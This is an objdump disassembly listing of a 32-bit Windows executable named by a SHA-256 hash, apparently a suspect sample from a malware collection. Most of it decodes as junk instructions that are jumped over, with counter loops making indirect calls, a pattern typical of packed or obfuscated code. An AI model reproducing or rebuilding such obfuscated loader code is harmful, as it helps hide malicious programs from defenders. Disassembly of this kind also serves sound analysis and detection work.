
38f269057287e9370077f06fe9009d501fbe54eabf20a2c174525ff866365169.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x822eaf8c
  40101f:	sar    DWORD PTR [esi+0x7e],0x7e
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	push   es
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x9503b59f
  4010d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010d3:	jp     0x4010f3
  4010d5:	out    0x48,eax
  4010d7:	nop
  4010d8:	fcom   st(3)
  4010da:	or     eax,0x118c3b94
  4010df:	mov    DWORD PTR [ebx+0x267a3766],esp
  4010e5:	xchg   ecx,eax
  4010e6:	lahf   
  4010e7:	or     bl,bh
  4010e9:	(bad)  
  4010eb:	push   edi
  4010ec:	test   eax,0xe87012e1
  4010f1:	not    BYTE PTR [ecx+0x55]
  4010f4:	dec    edx
  4010f5:	inc    esp
  4010f6:	bound  ecx,QWORD PTR [edi+0x51f6a811]
  4010fc:	or     DWORD PTR [edx],edx
  4010fe:	pop    ss
  4010ff:	test   DWORD PTR [edx],ecx
  401101:	inc    ebp
  401102:	out    0xdc,eax
  401104:	or     al,ah
  401106:	scas   al,BYTE PTR es:[edi]
  401107:	adc    esp,DWORD PTR [ecx+0x63272ccc]
  40110d:	dec    esp
  40110e:	push   ebx
  40110f:	lea    ebx,[edx]
  401111:	stos   DWORD PTR es:[edi],eax
  401112:	xor    ah,BYTE PTR [esi*8-0x79599fec]
  401119:	pop    es
  40111a:	sbb    BYTE PTR [edx-0x61f86696],al
  401120:	or     DWORD PTR [esi-0x7194dff5],ebx
  401126:	jbe    0x4010c1
  401128:	xchg   ebp,eax
  401129:	xor    ah,0xd8
  40112c:	fcomp  QWORD PTR [ebp-0x56]
  40112f:	mov    al,0x89
  401131:	mov    eax,0xaa8a9b86
  401136:	repnz pop ebx
  401138:	xchg   BYTE PTR [esi],cl
  40113a:	jecxz  0x401162
  40113c:	inc    esp
  40113d:	gs (bad) 
  40113f:	xor    dh,BYTE PTR [eax]
  401141:	dec    edi
  401142:	xor    DWORD PTR [eax-0x58717b77],eax
  401148:	xorps  xmm3,xmm7
  40114b:	adc    BYTE PTR [ecx],bh
  40114d:	jbe    0x401165
  40114f:	mov    eax,0x9b11ce59
  401154:	sbb    ah,dl
  401156:	dec    esi
  401157:	mov    bl,0x2c
  401159:	xor    edi,DWORD PTR [eax-0x6c2e4af4]
  40115f:	mov    ds:0x8d5ca3e,eax
  401164:	and    edi,ecx
  401166:	add    DWORD PTR [ebx+ebx*4-0xd],0x3075c768
  40116e:	test   BYTE PTR [esi+esi*8+0x215bb970],ch
  401175:	cwde   
  401176:	sub    DWORD PTR [esi+esi*8],ebp
  401179:	out    dx,al
  40117a:	pop    ecx
  40117b:	repz aam 0xc3
  40117e:	jns    0x401186
  401180:	dec    edi
  401181:	ret    
  401182:	loop   0x4011d7
  401184:	xchg   edx,eax
  401185:	inc    ebp
  401186:	retf   
  401187:	call   0xa17aed44
  40118c:	mov    ah,0x89
  40118e:	mov    eax,0x212bacaf
  401193:	rcl    DWORD PTR [ebx+0x266ccd64],1
  401199:	out    0x94,eax
  40119b:	pusha  
  40119c:	xchg   ebx,eax
  40119d:	mov    edx,0x45601350
  4011a2:	in     al,dx
  4011a3:	sbb    cl,bh
  4011a5:	or     al,0xae
  4011a7:	or     DWORD PTR [ebx+0x2e],0x217fbb6d
  4011ae:	(bad)
  4011b2:	and    eax,0x9027b417
  4011b7:	jnp    0x4011a1
  4011b9:	pushf  
  4011ba:	mov    cl,BYTE PTR [ebp+ebx*1+0x5a81fb4f]
  4011c1:	mov    al,0x7b
  4011c3:	imul   edi,edi,0x637e8897
  4011c9:	and    esp,eax
  4011cb:	or     DWORD PTR [ecx],edi
  4011cd:	cli    
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x17a48ae1]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x401346
  4012cc:	aaa    
  4012cd:	clc    
  4012ce:	pusha  
  4012cf:	mov    WORD PTR [edi+edi*4-0x61],?
  4012d3:	in     al,dx
  4012d4:	sbb    eax,0x6e7cdf32
  4012d9:	dec    edi
  4012da:	pushf  
  4012db:	mov    bh,0xdb
  4012dd:	mov    cl,0x3d
  4012df:	xor    esp,DWORD PTR [ebx]
  4012e1:	ds iret 
  4012e3:	sbb    ebx,DWORD PTR [ebp+0x6784b26]
  4012e9:	mov    ds:0x73070934,eax
  4012ee:	scas   al,BYTE PTR es:[edi]
  4012ef:	and    ecx,DWORD PTR ds:0x93c44153
  4012f5:	adc    ebx,DWORD PTR [edi+0x124141b7]
  4012fb:	xchg   esp,eax
  4012fc:	mov    DWORD PTR [esi+0x3a],ebx
  4012ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401300:	mov    al,0xeb
  401302:	fcom   st(2)
  401304:	jno    0x40131e
  401306:	cmp    eax,0xc6b6dbaf
  40130b:	inc    eax
  40130c:	sub    DWORD PTR [eax-0x20e5ccef],esi
  401312:	test   DWORD PTR [edi],edx
  401314:	stc    
  401315:	aas    
  401316:	xchg   edi,eax
  401317:	cmp    eax,0xc8ef1e07
  40131c:	fcomip st,st(4)
  40131e:	fstp   st(6)
  401320:	ficom  WORD PTR [edi-0x28dbacc1]
  401326:	lea    ebx,[ebp-0x75127b86]
  40132c:	mov    bl,0xce
  40132e:	xlat   BYTE PTR ds:[ebx]
  40132f:	adc    BYTE PTR [edx],dh
  401331:	cmp    ebp,DWORD PTR ds:0x598637f2
  401337:	pop    edi
  401338:	inc    ebx
  401339:	cs push 0x79bb451d
  40133f:	and    al,0xe4
  401341:	add    esi,DWORD PTR [si-0x63]
  401345:	ja     0x401340
  401347:	in     al,dx
  401348:	mov    eax,ebx
  40134a:	sahf   
  40134b:	add    BYTE PTR [edi+0x2c],dh
  40134e:	fsin   
  401350:	pop    ss
  401351:	enter  0x197c,0xb5
  401355:	push   ds
  401356:	and    DWORD PTR [esi+0x16],0x87d139e7
  40135d:	xchg   DWORD PTR ds:0xbc37f0b1,ebx
  401363:	add    BYTE PTR [edx-0x5bc5b7b1],dl
  401369:	add    al,0xbd
  40136b:	fadd   st,st(7)
  40136d:	pushf  
  40136e:	jnp    0x4013c7
  401370:	in     al,0x71
  401372:	repnz lds esp,FWORD PTR [edi*8-0x9918ef7]
  40137a:	and    al,0x9c
  40137c:	adc    eax,DWORD PTR [ebx-0x61ef79a9]
  401382:	lods   al,BYTE PTR ds:[esi]
  401383:	mov    al,0x7c
  401385:	hlt    
  401386:	addr16 pop es
  401388:	mul    BYTE PTR [edx]
  40138a:	add    esi,DWORD PTR [ebp-0x6a]
  40138d:	call   0x491d4777
  401392:	sti    
  401393:	sbb    BYTE PTR [esp],ah
  401396:	mov    ebp,0x61cec261
  40139b:	repnz mov ds:0x98ecd2bc,eax
  4013a1:	jp     0x401376
  4013a3:	cwde   
  4013a4:	scas   eax,DWORD PTR es:[edi]
  4013a5:	fstp   QWORD PTR [ecx]
  4013a7:	lods   al,BYTE PTR ds:[esi]
  4013a8:	lea    ebx,cs:[ebx+0x70249fd0]
  4013af:	cmp    edx,esi
  4013b1:	(bad)  
  4013b2:	xor    ebp,ecx
  4013b4:	push   0xf0767273
  4013b9:	inc    eax
  4013ba:	mov    dl,0x37
  4013bc:	xchg   ebx,eax
  4013bd:	sbb    bh,BYTE PTR [ebp-0xacdc725]
  4013c3:	fmul   QWORD PTR [ecx-0x1a]
  4013c6:	sub    al,0xc0
  4013c8:	push   es
  4013c9:	push   ecx
  4013ca:	aad    0x36
  4013cc:	mov    DWORD PTR [edi+0x70],ebx
  4013cf:	rcr    cl,cl
  4013d1:	aam    0x99
  4013d3:	js     0x4013f9
  4013d5:	ds test eax,0xc53a9cc
  4013db:	inc    ebp
  4013dc:	inc    ecx
  4013dd:	push   ebp
  4013de:	(bad)  
  4013e0:	ficomp DWORD PTR [edx+0x26]
  4013e3:	shr    DWORD PTR [ebp+0x5f5c03ed],0xa8
  4013ea:	pop    ebx
  4013eb:	(bad)  
  4013ec:	clc    
  4013ed:	mov    bl,0x2c
  4013ef:	inc    edi
  4013f0:	jecxz  0x401424
  4013f2:	add    bh,BYTE PTR [edx-0xf]
  4013f5:	xchg   edi,eax
  4013f6:	ins    DWORD PTR es:[edi],dx
  4013f7:	sub    BYTE PTR [edi],dh
  4013f9:	push   ss
  4013fa:	(bad)  
  4013fc:	xchg   esi,eax
  4013fd:	daa    
  4013fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013ff:	in     al,0xf2
  401401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401402:	test   ebp,eax
  401404:	outs   dx,BYTE PTR gs:[esi]
  401406:	std    
  401407:	shl    BYTE PTR [ecx+0x17],0xcf
  40140b:	fucomi st,st(1)
  40140d:	fcom   DWORD PTR [ecx+edi*8-0x6e2b0a40]
  401414:	jmp    0x948e7d8
  401419:	dec    eax
  40141a:	cmp    eax,0x947c10b0
  40141f:	xchg   ecx,eax
  401420:	xchg   edx,eax
  401421:	sub    ch,0x17
  401424:	or     cl,BYTE PTR [eax+0x7a]
  401427:	arpl   bx,si
  401429:	in     eax,0x95
  40142b:	and    DWORD PTR [edi+0x18829910],esi
  401431:	mov    ch,ch
  401433:	mov    dl,BYTE PTR [esi-0x3a944e75]
  401439:	int3   
  40143a:	es adc eax,0x81f36ea1
  401440:	int    0x9
  401442:	(bad)  [ecx-0x57]
  401445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401446:	add    al,0x23
  401448:	data16 sub ch,al
  40144b:	or     bl,al
  40144d:	or     al,0x36
  40144f:	dec    eax
  401450:	pop    ebx
  401451:	jo     0x401496
  401453:	std    
  401454:	sbb    BYTE PTR [edi],0x85
  401457:	sub    eax,0xe22a4d92
  40145c:	pop    eax
  40145d:	fs sbb al,ch
  401460:	add    BYTE PTR [edx+0x63],dl
  401463:	ror    DWORD PTR [edi+0xe],1
  401466:	loop   0x401400
  401468:	pop    ds
  401469:	xchg   ebx,eax
  40146a:	inc    edi
  40146b:	cwde   
  40146c:	pop    es
  40146d:	cmp    BYTE PTR [ecx],ah
  40146f:	retf   
  401470:	mov    ds:0x8a3cb956,eax
  401475:	add    BYTE PTR [eax],al
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x54630fff
  4014a7:	pop    ebp
  4014a8:	outs   dx,BYTE PTR ds:[esi]
  4014a9:	ret    0x7e7d
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401490
  4014b2:	pusha  
  4014b3:	mov    ecx,0x18d81c58
  4014b8:	pop    ecx
  4014b9:	inc    ecx
  4014ba:	in     al,0xf4
  4014bc:	call   0x8fb:0x7d257f5
  4014c3:	jno    0x401509
  4014c5:	sbb    DWORD PTR [ebp-0x6a],esi
  4014c8:	ror    DWORD PTR [ebx-0x8bd3449],cl
  4014ce:	rol    BYTE PTR [eax+0x46f80ba6],cl
  4014d4:	cmp    al,0x71
  4014d7:	inc    edi
  4014d8:	dec    ebx
  4014d9:	lods   al,BYTE PTR ds:[esi]
  4014da:	stc    
  4014db:	pop    edx
  4014dc:	jg     0x40151e
  4014de:	xchg   esi,eax
  4014df:	jge    0x40149e
  4014e1:	mov    esp,cs
  4014e3:	cld    
  4014e4:	outs   dx,BYTE PTR ds:[esi]
  4014e5:	xchg   edi,eax
  4014e6:	jle    0x4014ca
  4014e8:	pop    edx
  4014e9:	out    dx,al
  4014ea:	inc    eax
  4014eb:	mov    al,0xf7
  4014ed:	daa    
  4014ee:	(bad)  
  4014ef:	and    eax,DWORD PTR [edx+0x38]
  4014f2:	adc    al,0x4d
  4014f4:	add    eax,0xdbc05548
  4014f9:	clc    
  4014fa:	jp     0x4014e8
  4014fc:	stos   DWORD PTR es:[edi],eax
  4014fd:	hlt    
  4014fe:	and    DWORD PTR [eax-0x76],ebx
  401501:	xor    ch,ah
  401503:	pop    ebx
  401504:	gs icebp 
  401506:	ret    
  401507:	xor    DWORD PTR [eax+0x2f3e0b27],esp
  40150d:	dec    esi
  40150e:	in     al,0x5c
  401510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401511:	gs dec esp
  401513:	ret    
  401514:	xlat   BYTE PTR ds:[ebx]
  401515:	clc    
  401516:	inc    esi
  401517:	fild   QWORD PTR [bx+si+0x19]
  40151b:	ins    BYTE PTR es:[edi],dx
  40151c:	or     DWORD PTR [edx-0x8],edx
  40151f:	out    0xde,al
  401521:	test   dl,ah
  401523:	mov    esp,DWORD PTR [edi+0x9]
  401526:	and    eax,0x385faa03
  40152b:	cmp    BYTE PTR [edx+0x7520c612],dh
  401531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401532:	lds    esi,FWORD PTR [esi]
  401534:	pop    esi
  401535:	xchg   ecx,eax
  401536:	icebp  
  401537:	xchg   DWORD PTR [esi+0x37],eax
  40153a:	shr    DWORD PTR [ecx+0x2baa9c00],cl
  401540:	fidivr DWORD PTR ds:0x4f8c370e
  401546:	popa   
  401547:	jno    0x401515
  401549:	inc    esi
  40154a:	push   ds
  40154b:	mov    bh,0x83
  40154d:	aad    0xb3
  40154f:	adc    eax,0x3872f4ea
  401554:	lods   al,BYTE PTR ds:[esi]
  401555:	cmp    edx,DWORD PTR [ecx-0x5cc034d0]
  40155b:	inc    DWORD PTR [ebp+0x4b]
  40155e:	inc    ecx
  40155f:	mov    ebx,0x8a1c52b5
  401564:	push   ds
  401565:	inc    ebx
  401566:	mov    ebx,0xbe3252a9
  40156b:	sub    dh,BYTE PTR [ecx-0x7a]
  40156e:	push   ebx
  40156f:	sbb    al,0x6c
  401571:	xor    al,0x48
  401573:	and    BYTE PTR [ebx+0x7b],dl
  401576:	mov    edx,0x8b73fc10
  40157b:	mov    ds,WORD PTR [edi+ecx*2+0x14]
  40157f:	stos   DWORD PTR es:[edi],eax
  401580:	sbb    BYTE PTR [eax],cl
  401582:	push   esi
  401583:	call   0x45d9:0x208e3156
  40158a:	in     eax,dx
  40158b:	call   0xe2e7:0xc0a9b520
  401592:	add    ch,BYTE PTR ss:[eax+0x3c]
  401596:	push   ss
  401597:	push   0x79
  401599:	xor    BYTE PTR ds:0xad0d31d,dh
  40159f:	ret    
  4015a0:	shl    ebp,1
  4015a2:	mov    DWORD PTR [esi-0x63],ecx
  4015a5:	mov    BYTE PTR [eax+0x42],cl
  4015a8:	sbb    ebp,ecx
  4015aa:	lods   al,BYTE PTR ds:[esi]
  4015ab:	imul   esi,DWORD PTR [ebx+0xa8347a2],0x5d
  4015b2:	dec    ecx
  4015b3:	fstp   TBYTE PTR [ebp-0x625163c]
  4015b9:	lods   eax,DWORD PTR ds:[esi]
  4015ba:	out    0xc,eax
  4015bc:	xor    edx,ebp
  4015be:	push   0xffffffbd
  4015c0:	aaa    
  4015c1:	fiadd  WORD PTR [edi+0x442ffdf9]
  4015c7:	in     eax,dx
  4015c8:	jge    0x401587
  4015ca:	jle    0x4015eb
  4015cc:	or     DWORD PTR [eax],edx
  4015ce:	jb     0x401629
  4015d0:	xor    edx,ebp
  4015d2:	and    esp,ebp
  4015d4:	fimul  WORD PTR [ebp+0x7c]
  4015d7:	cmp    cl,BYTE PTR [edi-0x60]
  4015da:	inc    eax
  4015db:	sub    eax,0x53456dc3
  4015e0:	cmp    BYTE PTR [ebp-0x52],0x4e
  4015e4:	mov    ah,0xb
  4015e6:	pop    ds
  4015e7:	add    al,0xc4
  4015e9:	mov    esp,0x71095fa4
  4015ee:	jmp    0x40161f
  4015f0:	lods   al,BYTE PTR ds:[esi]
  4015f1:	bound  eax,QWORD PTR [esi+0x6b57a9b3]
  4015f7:	daa    
  4015f8:	dec    ebp
  4015f9:	test   DWORD PTR [ecx+ebx*2],0x564d8b80
  401600:	sub    al,0xe8
  401602:	popf   
  401603:	aam    0xd0
  401605:	cmp    bh,BYTE PTR [esi+eax*2+0x1261601e]
  40160c:	hlt    
  40160d:	call   0xfbb5cd5f
  401612:	mov    dh,BYTE PTR [edi+0x4e]
  401615:	push   eax
  401616:	sbb    edx,DWORD PTR ds:0x61763cae
  40161c:	xchg   ebp,eax
  40161d:	inc    edi
  40161e:	and    eax,0xae0e1db7
  401623:	xchg   esi,eax
  401624:	out    0xb3,eax
  401626:	dec    ecx
  401627:	das    
  401628:	or     edx,DWORD PTR [ebx-0x32ec1bea]
  40162e:	in     al,0xc9
  401630:	push   0xc8a3e7b9
  401635:	inc    edi
  401636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401637:	jo     0x401694
  401639:	mov    BYTE PTR ss:[ebx+0x12],cl
  40163d:	call   0xea81e6b
  401642:	xor    dl,BYTE PTR [edx+ebx*1]
  401645:	sub    eax,0xd87b5c00
  40164a:	das    
  40164b:	mov    ds:0x8636cc97,eax
  401650:	mov    al,ds:0x4d80f37f
  401655:	xchg   esi,eax
  401656:	push   ecx
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	xchg   ebp,eax
  40166c:	or     dh,BYTE PTR [ebx+0x7e7a6c72]
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x401610
  401678:	and    eax,0x6e35e133
  40167d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40167e:	jb     0x401693
  401680:	push   0x3aac60cf
  401685:	dec    edi
  401686:	mov    ds:0xa125139c,eax
  40168b:	mov    BYTE PTR ds:0x1aec663b,ch
  401691:	sbb    bh,BYTE PTR [ebx]
  401693:	arpl   WORD PTR [edi+eax*2+0x1e6194ae],bp
  40169a:	test   eax,0xaba4a3c5
  40169f:	adc    edx,edx
  4016a1:	mov    ds:0xe92074ff,eax
  4016a6:	mov    WORD PTR [esi],ds
  4016a8:	and    ecx,DWORD PTR [esi+0x1c]
  4016ab:	pop    ds
  4016ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ad:	int3   
  4016ae:	call   0x30c1b4c2
  4016b3:	push   ebp
  4016b4:	cmp    ebp,0x8ec49011
  4016ba:	jbe    0x4016fa
  4016bc:	int3   
  4016bd:	rcr    DWORD PTR [edi+esi*8],1
  4016c0:	sub    DWORD PTR [esi-0x537a96ba],ebp
  4016c6:	in     al,dx
  4016c7:	jge    0x4016ad
  4016c9:	push   esp
  4016ca:	cdq    
  4016cb:	ja     0x401671
  4016cd:	cli    
  4016ce:	mov    eax,ds:0x4911baca
  4016d3:	add    BYTE PTR [edi+0x3c],dh
  4016d6:	xor    esi,ebx
  4016d8:	adc    DWORD PTR [edi+0x37],ecx
  4016db:	xor    DWORD PTR [edi-0x6b1ba0b1],edi
  4016e1:	not    BYTE PTR [ebx]
  4016e3:	rcr    BYTE PTR [edx],0x28
  4016e6:	lods   al,BYTE PTR ds:[esi]
  4016e7:	cld    
  4016e8:	in     eax,dx
  4016e9:	out    0x69,al
  4016eb:	mov    dl,0x13
  4016ed:	stos   BYTE PTR es:[edi],al
  4016ee:	hlt    
  4016ef:	icebp  
  4016f0:	test   al,0xfe
  4016f2:	push   ebp
  4016f3:	xor    ecx,DWORD PTR [eax]
  4016f5:	jmp    0x8e58eeb6
  4016fa:	mov    ecx,ebx
  4016fc:	gs inc esp
  4016fe:	inc    ecx
  4016ff:	inc    edi
  401700:	(bad)  [edx]
  401702:	ret    
  401703:	lock out dx,al
  401705:	xor    ebx,DWORD PTR [eax]
  401707:	push   ebp
  401708:	sbb    al,0xcd
  40170a:	out    dx,eax
  40170b:	fs mov dh,0x68
  40170e:	cmp    edx,ebp
  401710:	jae    0x4016ba
  401712:	fstp   st(3)
  401714:	dec    edi
  401715:	mov    bh,0xc8
  401717:	std    
  401718:	mov    ebp,edx
  40171a:	and    al,0x1a
  40171c:	bound  edi,QWORD PTR [edx-0x12381e98]
  401722:	push   edi
  401723:	inc    edi
  401724:	xchg   esp,eax
  401725:	fbld   TBYTE PTR [ecx+ebx*1-0x15]
  401729:	mov    WORD PTR ds:0x76b0e8c6,fs
  40172f:	sti    
  401730:	adc    eax,0x4f449ad6
  401735:	icebp  
  401736:	add    BYTE PTR [eax],bl
  401738:	add    DWORD PTR [ecx+0x77b4eaa5],0x2e
  40173f:	ret    
  401740:	mov    BYTE PTR [esi],bh
  401742:	add    cl,dl
  401744:	sub    cl,bh
  401746:	jle    0x40173a
  401748:	pop    ecx
  401749:	jp     0x40174c
  40174b:	pop    ds
  40174c:	ret    
  40174d:	or     al,0x1a
  40174f:	ret    0xffe8
  401752:	stos   DWORD PTR es:[edi],eax
  401753:	inc    eax
  401754:	xlat   BYTE PTR ds:[ebx]
  401755:	xchg   edi,eax
  401756:	call   0x21ca2578
  40175b:	mov    ch,0x87
  40175d:	(bad)  
  40175e:	jbe    0x401736
  401760:	sti    
  401761:	inc    ecx
  401762:	in     al,dx
  401763:	outs   dx,BYTE PTR ds:[esi]
  401764:	push   esp
  401765:	lds    esp,FWORD PTR [ecx+ebx*2]
  401768:	mov    ebx,0x4cd8dba0
  40176d:	inc    ebp
  40176e:	xor    eax,0xfc3921be
  401773:	mov    dl,0xe4
  401775:	sbb    al,0xd2
  401777:	imul   edi,esp,0xb7d3db2e
  40177d:	adc    DWORD PTR [eax+0x76dfd75e],esp
  401783:	fld    TBYTE PTR [ebp+eiz*8-0x5b]
  401787:	stos   DWORD PTR es:[edi],eax
  401788:	sbb    al,0x97
  40178a:	mov    ch,0x2b
  40178c:	or     ebx,DWORD PTR [ebp-0x22dcc829]
  401792:	sub    al,0xf
  401794:	dec    ecx
  401795:	and    eax,DWORD PTR [ebx]
  401797:	mov    ebp,DWORD PTR [ebp-0x60]
  40179a:	or     al,0x9c
  40179c:	rcr    DWORD PTR [edi+eax*8-0x3f],1
  4017a0:	or     al,0xbd
  4017a2:	nop
  4017a3:	sbb    BYTE PTR [edx],bh
  4017a5:	push   ebp
  4017a6:	cmc    
  4017a7:	sub    eax,0x69e560f7
  4017ac:	add    al,BYTE PTR [eax+0x6d]
  4017af:	adc    BYTE PTR [ecx],bl
  4017b1:	add    eax,ebx
  4017b3:	mov    ebx,edx
  4017b5:	fist   WORD PTR [eax+0x7]
  4017b8:	mov    ds:0x99d66e47,eax
  4017bd:	sahf   
  4017be:	xchg   ebx,eax
  4017bf:	out    0x86,al
  4017c1:	xchg   esp,eax
  4017c2:	bound  eax,QWORD PTR [esi+0x7]
  4017c5:	jae    0x4017f4
  4017c7:	inc    edi
  4017c8:	and    DWORD PTR [esi],ebx
  4017ca:	fmulp  st(7),st
  4017cc:	mov    eax,ds:0x43925d8
  4017d1:	xchg   BYTE PTR [eax-0x57d4bd07],bl
  4017d7:	xlat   BYTE PTR ds:[ebx]
  4017d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d9:	or     bl,dh
  4017db:	mov    WORD PTR [ebx],?
  4017dd:	and    al,0xe7
  4017df:	jb     0x40181b
  4017e1:	push   ecx
  4017e2:	mov    ebp,0xb2fc5c92
  4017e7:	sub    BYTE PTR [ebx+0x44],ch
  4017ea:	mov    bh,0xd1
  4017ec:	mov    al,0x15
  4017ee:	xchg   edi,eax
  4017ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017f0:	xchg   edx,eax
  4017f1:	cli    
  4017f2:	mov    esi,0x2cfcaa2d
  4017f7:	icebp  
  4017f8:	jb     0x401821
  4017fa:	mov    bh,0x41
  4017fc:	cmc    
  4017fd:	in     al,0x32
  4017ff:	cmp    eax,0x512734ac
  401804:	xchg   BYTE PTR [ecx-0x2f481d7d],ch
  40180a:	push   ss
  40180b:	xlat   BYTE PTR ds:[ebx]
  40180c:	push   eax
  40180d:	das    
  40180e:	adc    BYTE PTR [edi+0x69dd2a1f],bl
  401814:	mov    eax,0x6b365675
  401819:	fdiv   QWORD PTR [esi+0x2bf82ac]
  40181f:	cmp    eax,DWORD PTR [eax]
  401821:	add    BYTE PTR [esi+0x3],ah
  401824:	mov    edi,0x4302d505
  40182a:	add    al,bl
  40182c:	pusha  
  40182d:	add    BYTE PTR [eax],al
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
